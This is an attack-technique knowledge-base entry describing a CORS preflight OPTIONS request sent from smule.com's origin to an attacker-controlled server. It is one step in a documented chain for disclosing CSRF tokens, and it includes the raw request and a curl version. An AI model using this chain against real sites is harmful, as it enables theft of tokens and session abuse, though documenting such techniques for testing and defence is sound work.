---
id: cmd-smule-options-preflight-001
name: send-options-preflight-to-localhost
type: command
executor: http
data: >-
  OPTIONS /user/check_email HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0
  (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept:
  text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language:
  en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nAccess-Control-Request-Method:
  POST\nAccess-Control-Request-Headers: x-csrf-token,x-smulen\nOrigin:
  https://www.smule.com\nConnection: close
output: null
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:50.325Z'
platforms:
  - Web
tags:
  - cors
  - csrf
verified: false
validated: true
submitted: true
---

# send-options-preflight-to-localhost

## Command

```http
OPTIONS /user/check_email HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Access-Control-Request-Method: POST
Access-Control-Request-Headers: x-csrf-token,x-smulen
Origin: https://www.smule.com
Connection: close
```

## Description

This is the browser-triggered CORS preflight OPTIONS request sent to the attacker-controlled localhost due to the poisoned page, requesting permission for the subsequent POST with specific headers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Origin | Victim's origin (https://www.smule.com) for CORS check | Yes |
| Access-Control-Request-Headers | Headers the POST will use (x-csrf-token, x-smulen) | Yes |
| Access-Control-Request-Method | Method for the actual request (POST) | Yes |

## Examples

### Basic Usage

Triggered automatically by browser on form submit.

### Advanced Usage

Manual send via curl:
```bash
curl -X OPTIONS "http://localhost/user/check_email" -H "Origin: https://www.smule.com" -H "Access-Control-Request-Method: POST" -H "Access-Control-Request-Headers: x-csrf-token,x-smulen"
```

## Expected Output

Attacker server responds with 200 OK, Access-Control-Allow-Origin: https://www.smule.com, Access-Control-Allow-Methods: POST, Access-Control-Allow-Headers: x-csrf-token,x-smulen.

## Related

- [[Related Procedure: Trigger-Email-Check-to-Disclose-CSRF-Token]]
